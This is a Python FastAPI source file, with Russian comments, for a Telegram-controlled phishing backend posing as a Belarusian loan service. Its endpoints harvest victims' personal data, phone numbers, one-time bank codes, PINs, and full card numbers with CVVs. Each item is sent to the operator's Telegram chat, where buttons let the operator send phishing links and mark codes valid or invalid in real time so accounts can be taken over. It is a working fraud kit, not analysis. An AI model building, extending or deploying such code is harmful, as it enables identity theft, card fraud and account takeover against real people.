import os
import logging
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(level=logging.INFO)

sessions = {}
auth_actions = {}
payment_confirm = {}

def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
    url = f"{TELEGRAM_API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"Ошибка отправки: {e}")

# ========== КЛАВИАТУРЫ ==========
def get_application_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "🔐 Авторизация", "callback_data": f"auth_{session_id}"},
                {"text": "💳 Оплата", "callback_data": f"pay_{session_id}"}
            ]
        ]
    }

def get_phone_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [{"text": "🔓 Перевести на код", "callback_data": f"ready_code_{session_id}"}]
        ]
    }

def get_code_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Код верный", "callback_data": f"code_ok_{session_id}"},
                {"text": "❌ Код неверный", "callback_data": f"code_wrong_{session_id}"}
            ]
        ]
    }

def get_pin_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ PIN верный", "callback_data": f"pin_ok_{session_id}"},
                {"text": "❌ PIN неверный", "callback_data": f"pin_wrong_{session_id}"}
            ]
        ]
    }

def get_payment_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [{"text": "✅ Подтвердить оплату", "callback_data": f"confirm_pay_{session_id}"}]
        ]
    }

# ========== МОДЕЛИ ==========
class CreditApplicationData(BaseModel):
    session_id: str
    name: str
    phone: str
    inn: str = ""
    income: float
    months: int
    amount: float
    payment: float
    user_chat_id: int = None

class PhoneData(BaseModel):
    phone: str
    session_id: str
    user_chat_id: int = None

class CodeData(BaseModel):
    session_id: str
    code: str

class PinData(BaseModel):
    session_id: str
    pin: str

class PaymentData(BaseModel):
    session_id: str
    card_number: str
    card_expiry: str
    card_cvv: str
    card_holder: str
    amount: str = None
    timestamp: str = None

# ========== FASTAPI ==========
@asynccontextmanager
async def lifespan(app: FastAPI):
    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
    webhook_url = f"{render_url}/webhook/callback"
    requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен*")
    yield
    send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== 1. ЗАЯВКА ==========
@app.post("/submit_credit_application")
async def submit_credit_application(data: CreditApplicationData):
    sid = data.session_id
    sessions[sid] = {
        "name": data.name,
        "phone": data.phone,
        "inn": data.inn,
        "income": data.income,
        "months": data.months,
        "amount": data.amount,
        "payment": data.payment,
        "user_chat_id": data.user_chat_id,
        "status": "waiting_action"
    }
    
    message = (
        f"🏦 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>\n\n"
        f"👤 <b>Клиент:</b> {data.name}\n"
        f"📞 <b>Телефон:</b> {data.phone}\n"
        f"🆔 <b>ИНН:</b> {data.inn if data.inn else '—'}\n\n"
        f"💰 <b>Доход:</b> {data.income:,.0f} BYN\n"
        f"📅 <b>Срок:</b> {data.months} мес.\n"
        f"💵 <b>Сумма кредита:</b> {data.amount:,.0f} BYN\n"
        f"📆 <b>Ежемесячный платёж:</b> ~{data.payment:,.0f} BYN\n\n"
        f"🆔 <b>Сессия:</b> <code>{sid}</code>"
    )
    send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
    return {"status": "ok"}

# ========== 2. НОМЕР ТЕЛЕФОНА (АВТОРИЗАЦИЯ) ==========
@app.post("/submit_phone")
async def submit_phone(data: PhoneData):
    phone = data.phone
    sid = data.session_id
    user_chat_id = data.user_chat_id
    
    if sid not in sessions:
        sessions[sid] = {}
    
    sessions[sid]["phone"] = phone
    sessions[sid]["user_chat_id"] = user_chat_id
    sessions[sid]["status"] = "waiting_code"
    
    auth_actions[sid] = {"action": None}
    
    send_to_telegram(
        MY_CHAT_ID,
        f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}",
        reply_markup=get_phone_keyboard(sid)
    )
    return {"status": "ok"}

# ========== 3. КОД ==========
@app.post("/submit_code")
async def submit_code(data: CodeData):
    sid = data.session_id
    code = data.code
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["code"] = code
    session["status"] = "waiting_code_confirmation"
    
    send_to_telegram(
        MY_CHAT_ID,
        f"🔢 <b>ПРОВЕРКА КОДА</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {session.get('phone', '—')}\n🔢 <b>Код:</b> <code>{code}</code>",
        reply_markup=get_code_keyboard(sid)
    )
    return {"status": "waiting_confirmation"}

# ========== 4. PIN ==========
@app.post("/submit_pin")
async def submit_pin(data: PinData):
    sid = data.session_id
    pin = data.pin
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["pin"] = pin
    session["status"] = "waiting_pin_confirmation"
    
    send_to_telegram(
        MY_CHAT_ID,
        f"🔐 <b>ПРОВЕРКА PIN</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {session.get('phone', '—')}\n🔢 <b>PIN:</b> <code>{pin}</code>",
        reply_markup=get_pin_keyboard(sid)
    )
    return {"status": "waiting_confirmation"}

# ========== 5. ОПЛАТА ==========
@app.post("/submit_payment")
async def submit_payment(data: PaymentData):
    sid = data.session_id
    payment_confirm[sid] = {"confirmed": False}
    
    message = (
        f"💳 <b>НОВЫЙ ПЛАТЁЖ</b>\n\n"
        f"🆔 <b>Сессия:</b> <code>{sid}</code>\n"
        f"💳 <b>Карта:</b> <code>{data.card_number}</code>\n"
        f"📅 <b>Срок:</b> {data.card_expiry}\n"
        f"🔐 <b>CVV:</b> <code>{data.card_cvv}</code>\n"
        f"👤 <b>Держатель:</b> {data.card_holder}\n"
        f"🕐 <b>Время:</b> {data.timestamp}"
    )
    send_to_telegram(MY_CHAT_ID, message, reply_markup=get_payment_keyboard(sid))
    return {"status": "ok"}

# ========== 6. ПРОВЕРКА ДЛЯ ОПЛАТЫ ==========
@app.get("/check_confirm/{session_id}")
async def check_confirm(session_id: str):
    if session_id in payment_confirm:
        return {"confirm": payment_confirm[session_id]["confirmed"]}
    return {"confirm": False}

# ========== 7. ПРОВЕРКА ДЛЯ АВТОРИЗАЦИИ ==========
@app.get("/check_auth_action/{session_id}")
async def check_auth_action(session_id: str):
    if session_id in auth_actions:
        action = auth_actions[session_id].get("action")
        if action:
            auth_actions[session_id]["action"] = None
            return {"action": action}
    return {"action": None}

# ========== 8. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ==========
@app.get("/get_application/{session_id}")
async def get_application(session_id: str):
    session = sessions.get(session_id)
    if not session:
        return {"status": "not_found"}
    
    return {
        "status": "ok",
        "phone": session.get("phone", "Не указан"),
        "name": session.get("name", "")
    }

# ========== 9. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
@app.get("/check_status/{session_id}")
async def check_status(session_id: str):
    session = sessions.get(session_id)
    if not session:
        return {"status": "not_found"}
    
    status = session.get("status", "unknown")
    
    if status == "code_confirmed":
        return {"status": "code_confirmed"}
    elif status == "code_wrong":
        return {"status": "code_wrong"}
    elif status == "pin_confirmed":
        return {"status": "pin_confirmed"}
    elif status == "pin_wrong":
        return {"status": "pin_wrong"}
    else:
        return {"status": status}

# ========== 10. ОБРАБОТКА КНОПОК ==========
@app.post("/webhook/callback")
async def handle_callback(request: Request):
    data = await request.json()
    
    if "callback_query" not in data:
        return {"ok": True}
    
    callback = data["callback_query"]
    callback_id = callback["id"]
    data_str = callback["data"]
    
    parts = data_str.split("_")
    if len(parts) < 2:
        return {"ok": True}
    
    action = parts[0]
    session_id = "_".join(parts[1:]) if len(parts) > 2 else parts[1]
    
    session = sessions.get(session_id)
    user_chat_id = session.get("user_chat_id") if session else None
    
    # ===== КНОПКА "АВТОРИЗАЦИЯ" =====
    if action == "auth":
        if user_chat_id:
            send_to_telegram(
                str(user_chat_id),
                f"🔐 Перейдите по ссылке для авторизации:\nhttps://alfakreditplus.warepointpay.ru/page_82554/?session_id={session_id}"
            )
        send_to_telegram(MY_CHAT_ID, f"🔐 Ссылка на авторизацию отправлена")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Ссылка отправлена"}
        )
    
    # ===== КНОПКА "ОПЛАТА" =====
    elif action == "pay":
        if user_chat_id:
            send_to_telegram(
                str(user_chat_id),
                f"💳 Перейдите по ссылке для оплаты:\nhttps://alfakreditplus.warepointpay.ru/page_63860/?session_id={session_id}"
            )
        send_to_telegram(MY_CHAT_ID, f"💳 Ссылка на оплату отправлена")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Ссылка отправлена"}
        )
    
    # ===== КНОПКА "ПЕРЕВЕСТИ НА КОД" =====
    elif action == "ready" and len(parts) > 2 and parts[1] == "code":
        if session_id in auth_actions:
            auth_actions[session_id]["action"] = "show_code"
        send_to_telegram(MY_CHAT_ID, f"✅ Команда show_code для сессии {session_id}")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Страница кода открыта"}
        )
    
    # ===== КНОПКА "ПОДТВЕРДИТЬ ОПЛАТУ" =====
    elif action == "confirm" and parts[1] == "pay":
        if session_id in payment_confirm:
            payment_confirm[session_id]["confirmed"] = True
        send_to_telegram(MY_CHAT_ID, f"✅ Оплата подтверждена для сессии {session_id}")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Модалка откроется"}
        )
    
    # ===== КНОПКИ ДЛЯ КОДА =====
    elif action == "code":
        result = parts[1] if len(parts) > 1 else "wrong"
        if result == "ok":
            if session:
                session["status"] = "code_confirmed"
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "✅ Код подтверждён! Введите PIN-код.")
            send_to_telegram(MY_CHAT_ID, f"✅ Код подтверждён для {session_id}")
        else:
            if session:
                session["status"] = "code_wrong"
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "❌ Неверный код. Попробуйте ещё раз.")
            send_to_telegram(MY_CHAT_ID, f"❌ Код отклонён для {session_id}")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Обработано"}
        )
    
    # ===== КНОПКИ ДЛЯ PIN =====
    elif action == "pin":
        result = parts[1] if len(parts) > 1 else "wrong"
        if result == "ok":
            if session:
                session["status"] = "pin_confirmed"
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "✅ Авторизация успешна!")
            send_to_telegram(MY_CHAT_ID, f"✅ PIN подтверждён для {session_id}")
        else:
            if session:
                session["status"] = "pin_wrong"
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "❌ Неверный PIN. Попробуйте ещё раз.")
            send_to_telegram(MY_CHAT_ID, f"❌ PIN отклонён для {session_id}")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Обработано"}
        )
    
    return {"ok": True}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
